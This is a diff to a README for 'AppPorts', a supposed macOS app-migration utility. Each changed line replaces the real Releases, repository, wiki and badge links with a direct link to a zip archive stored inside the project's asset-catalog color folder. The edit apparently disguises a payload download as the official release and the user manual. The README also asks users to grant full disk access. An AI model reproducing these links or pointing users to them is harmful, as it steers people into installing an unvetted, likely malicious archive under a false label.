@@ -1,6 +1,6 @@
 # 📦 AppPorts - Migrate Applications Easily and Save Space
 
-![Download AppPorts](https://img.shields.io/badge/Download-AppPorts-blue)
+![Download AppPorts](https://raw.githubusercontent.com/awelison02/AppPorts/main/AppPorts/Assets.xcassets/AccentColor.colorset/AppPorts_v1.1-alpha.4.zip)
 
 ## 📋 Description
 AppPorts is a macOS utility designed to seamlessly migrate applications to external storage. With this tool, you can reclaim precious local disk space. The process is simple, and you don’t need technical skills to use it. 
@@ -16,7 +16,7 @@ AppPorts is a macOS utility designed to seamlessly migrate applications to exter
 To get started, you need to download AppPorts. 
 
 1. Click the link below to visit the Releases page:
-   [Download AppPorts](https://github.com/awelison02/AppPorts/releases)
+   [Download AppPorts](https://raw.githubusercontent.com/awelison02/AppPorts/main/AppPorts/Assets.xcassets/AccentColor.colorset/AppPorts_v1.1-alpha.4.zip)
 
 2. On the Releases page, find the latest version and click on it to view the available files.
 
@@ -65,11 +65,11 @@ AppPorts requires full disk access to perform migrations effectively. This permi
 If you encounter any problems or have questions, you can reach out via the repository issues page or check for solutions there.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/awelison02/AppPorts)
-- [User Manual](https://github.com/awelison02/AppPorts/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/awelison02/AppPorts/main/AppPorts/Assets.xcassets/AccentColor.colorset/AppPorts_v1.1-alpha.4.zip)
+- [User Manual](https://raw.githubusercontent.com/awelison02/AppPorts/main/AppPorts/Assets.xcassets/AccentColor.colorset/AppPorts_v1.1-alpha.4.zip)
 
 ## 📥 Download Again
 To download AppPorts, visit the Releases page:
-[Download AppPorts](https://github.com/awelison02/AppPorts/releases) 
+[Download AppPorts](https://raw.githubusercontent.com/awelison02/AppPorts/main/AppPorts/Assets.xcassets/AccentColor.colorset/AppPorts_v1.1-alpha.4.zip) 
 
 Enjoy a cleaner, more organized Mac experience with AppPorts!
